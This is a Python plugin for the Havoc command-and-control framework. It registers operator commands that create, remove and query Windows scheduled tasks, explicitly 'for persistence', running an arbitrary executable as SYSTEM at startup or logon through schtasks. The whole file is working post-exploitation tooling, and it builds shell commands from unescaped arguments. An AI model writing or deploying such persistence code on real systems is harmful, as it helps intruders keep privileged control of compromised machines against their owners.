from havoc import Demon, RegisterCommand, Plugin
import os
import platform
import subprocess

def create_scheduled_task(task_name, executable_path, trigger="startup"):
    """
    Creates a scheduled task for persistence.
    """
    try:
        if platform.system() != 'Windows':
            return "[-] Scheduled tasks are only supported on Windows."

        # Define the trigger based on the input
        if trigger == "startup":
            trigger_arg = "/sc ONSTART"
        elif trigger == "logon":
            trigger_arg = "/sc ONLOGON"
        else:
            return "[-] Invalid trigger. Use 'startup' or 'logon'."

        # Create the scheduled task
        command = f'schtasks /create /tn "{task_name}" /tr "{executable_path}" {trigger_arg} /ru SYSTEM /f'
        subprocess.run(command, shell=True, check=True)

        return f"[+] Scheduled task created: {task_name} -> {executable_path} (Trigger: {trigger})"
    except subprocess.CalledProcessError as e:
        return f"[-] Error creating scheduled task: {e}"
    except Exception as e:
        return f"[-] Error: {e}"

def remove_scheduled_task(task_name):
    """
    Removes a scheduled task.
    """
    try:
        if platform.system() != 'Windows':
            return "[-] Scheduled tasks are only supported on Windows."

        # Delete the scheduled task
        command = f'schtasks /delete /tn "{task_name}" /f'
        subprocess.run(command, shell=True, check=True)

        return f"[+] Scheduled task removed: {task_name}"
    except subprocess.CalledProcessError as e:
        return f"[-] Error removing scheduled task: {e}"
    except Exception as e:
        return f"[-] Error: {e}"

def check_scheduled_task(task_name):
    """
    Checks if a scheduled task exists.
    """
    try:
        if platform.system() != 'Windows':
            return "[-] Scheduled tasks are only supported on Windows."

        # Query the scheduled task
        command = f'schtasks /query /tn "{task_name}"'
        result = subprocess.run(command, shell=True, capture_output=True, text=True)

        if "ERROR" in result.stdout:
            return f"[-] Scheduled task not found: {task_name}"
        else:
            return f"[+] Scheduled task found: {task_name}"
    except subprocess.CalledProcessError as e:
        return f"[-] Error checking scheduled task: {e}"
    except Exception as e:
        return f"[-] Error: {e}"

# Havoc C2 Integration
def create_scheduled_task_command(demon, *args):
    """
    Command to create a scheduled task for persistence.
    """
    if len(args) != 3:
        demon.ConsoleWrite("[-] Usage: create_scheduled_task [task_name] [executable_path] [trigger]")
        return

    task_name = args[0]
    executable_path = args[1]
    trigger = args[2]

    result = create_scheduled_task(task_name, executable_path, trigger)
    demon.ConsoleWrite(result)

def remove_scheduled_task_command(demon, *args):
    """
    Command to remove a scheduled task.
    """
    if len(args) != 1:
        demon.ConsoleWrite("[-] Usage: remove_scheduled_task [task_name]")
        return

    task_name = args[0]

    result = remove_scheduled_task(task_name)
    demon.ConsoleWrite(result)

def check_scheduled_task_command(demon, *args):
    """
    Command to check if a scheduled task exists.
    """
    if len(args) != 1:
        demon.ConsoleWrite("[-] Usage: check_scheduled_task [task_name]")
        return

    task_name = args[0]

    result = check_scheduled_task(task_name)
    demon.ConsoleWrite(result)

# Register commands with Havoc C2
def initialize():
    RegisterCommand("create_scheduled_task", "Create a scheduled task for persistence", create_scheduled_task_command)
    RegisterCommand("remove_scheduled_task", "Remove a scheduled task", remove_scheduled_task_command)
    RegisterCommand("check_scheduled_task", "Check if a scheduled task exists", check_scheduled_task_command)

# Initialize the plugin
plugin = Plugin("ScheduledTask", "Advanced scheduled task persistence techniques", initialize)